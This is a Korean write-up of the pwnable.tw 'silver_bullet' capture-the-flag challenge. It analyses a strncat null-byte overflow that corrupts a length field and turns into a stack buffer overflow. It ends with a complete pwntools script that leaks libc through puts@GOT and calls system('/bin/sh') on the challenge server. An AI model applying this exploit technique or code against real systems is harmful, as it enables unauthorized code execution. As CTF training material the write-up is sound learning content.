# [summary]
- null byte bug
- bof -> rop

# analysis
```console
m444ndu@ubuntu:~/pwntw/silver_bullet$ checksec  silver_bullet 
[*] '/home/m444ndu/pwntw/silver_bullet/silver_bullet'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```


`main` 문의 `ebp-0x34` 위치의 변수를 다음과 같이 바꿔주시면 분석이 용이합니당
```ㅊ
_bullet{
    char bullet[0x30];
    int bullet_power;
}
```

## create_bullet()
```c

  if ( _bullet->bullet[0] )
    return puts("You have been created the Bullet !");
  printf("Give me your description of bullet :");
  read_input(_bullet, 0x30u);
  v2 = strlen(_bullet->bullet);
  printf("Your power is : %u\n", v2);
  _bullet->bullet_power = v2;
  return puts("Good luck !!");
```
그냥 초반에 입력받은 문자의 개수를 `bullet_power`에 저장합니다. 별로 중요하지는 않은 것 같습니다.

## power_up()
```c
int __cdecl power_up(struct bullet_struct *_bullet)
{
  char buf; // [esp+0h] [ebp-34h]
  int v3; // [esp+30h] [ebp-4h]

  v3 = 0;
  memset(&buf, 0, 0x30u);
  if ( !_bullet->bullet[0] )
    return puts("You need create the bullet first !");
  if ( _bullet->bullet_power > 0x2Fu )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(&buf, 48 - _bullet->bullet_power);
  strncat(_bullet->bullet, &buf, 48 - _bullet->bullet_power);
  v3 = strlen(&buf) + _bullet->bullet_power;
  printf("Your new power is : %u\n", v3);
  _bullet->bullet_power = v3;
  return puts("Enjoy it !");
 }
 ```
`bullet_power`가 <= 47일 경우 입력하지 않은 남은 `bullet` 공간의 크기만큼 입력을 더 받아 `bullet`에 추가한 뒤, `bullet_power`를 업데이트합니다. 사실 본 바이너리의 취약점은 여기서 발생합니다. 

기존 `bullet` 문자열에 추가를 `strncat()` 함수로 진행하는데, `strcat, strncat`의 경우 기존 `destination 문자열`의 `null`부터 문자열을 추가한 뒤, 뒤에 `null`을 붙입니다. `bullet` 배열 다음은 `bullet_power`이므로, `bullet_power`가 `null`로 덮어지는 경우가 발생합니다. 이 후 `bullet_power`는 기존 `buf`에 남아있는 문자열의 개수로 업데이트됩니다.

따라서, 만약 47만큼 `bullet`이 덮인 상황이라면 1바이트만큼 추가로 덮이게 되고, 본 함수가 끝날 때 `bullet_power`는 1로 업데이트됩니다. 여기에 다시 한번 `power_up()` 함수를 실행하면, `read_input()`으로 47바이트만큼 입력을 받아 `strncat()`을 통해 `bullet[0x31]`부터 덮어쓸 수 있게됩니다.`("A"*47 + "A" + "0x01" + 추가)` 
덮어쓸 수 있는 범위 안에 `eip`가 존재하므로 **ROP chain**을 통한 **exploit**이 가능합니다.


## beat()
```c
  if ( a1->bullet[0] )
  {
    puts(">----------- Werewolf -----------<");
    printf(" + NAME : %s\n", a2[1]);
    printf(" + HP : %d\n", *a2);
    puts(">--------------------------------<");
    puts("Try to beat it .....");
    usleep(1000000u);
    *a2 -= a1->bullet_power;
    if ( *a2 <= 0 )
    {
      puts("Oh ! You win !!");
      result = 1;
    }
```
`0x7fffffff`만큼있는 `Gin의 HP`를 `bullet_power`로 열심히 깎을 수 있습니다. `HP`가 0이하가 되면 1을 리턴하여 `main 함수`가 정상적으로 종료함으로써 아까 구성한 `ROP chain`을 사용할 수 있게 됩니다.

# exploit
```python
#! /usr/bin/python
from pwn import *

def powerup(data):
    r.sendlineafter('Your choice :','2')
    r.sendlineafter('bullet :',data)

def beat():
    r.sendlineafter('Your choice :','3')

r = process('./silver_bullet', env={'LD_PRELOAD':'./libc_32.so.6'})
r = remote('chall.pwnable.tw',10103)
#context.log_level = 'debug'
#gdb.attach(r,'b* 0x080488dd')


# ----- stage 1 : leak libc ----- #

### create bullet ###
r.sendlineafter('Your choice :','1')
r.sendlineafter('bullet :','A'*47)

### power up! ###
powerup('A')  # bullet_power -> 1

'''
puts@plt 0x80484a8:    jmp    DWORD PTR ds:0x804afdc

'''
payload = ''
payload += 'A'*7
payload += p32(0x080484a8) # puts@plt
payload += p32(0x08048475) # pop ebx ; ret
payload += p32(0x0804afdc) # puts@got
payload += p32(0x08048954) # return main

powerup(payload)
beat()
beat()

r.recvuntil('Oh ! You win !!\n')
leak = u32(r.recv(4))
libc_base = leak - 389440
success('libc_base = '+hex(libc_base))

system_addr = libc_base + 239936
binsh_addr = libc_base + 1412747

# ----- stage 2 : execute system("/bin/sh") ----- #

### create bullet ###
r.sendlineafter('Your choice :','1')
r.sendlineafter('bullet :','A'*47)

### power up! ###
powerup('A')  # bullet_power -> 1

payload2 = ''
payload2 += 'B'*7
payload2 += p32(system_addr)
payload2 += 'AAAA'
payload2 += p32(binsh_addr)

powerup(payload2)
beat()
beat()

r.interactive()
```
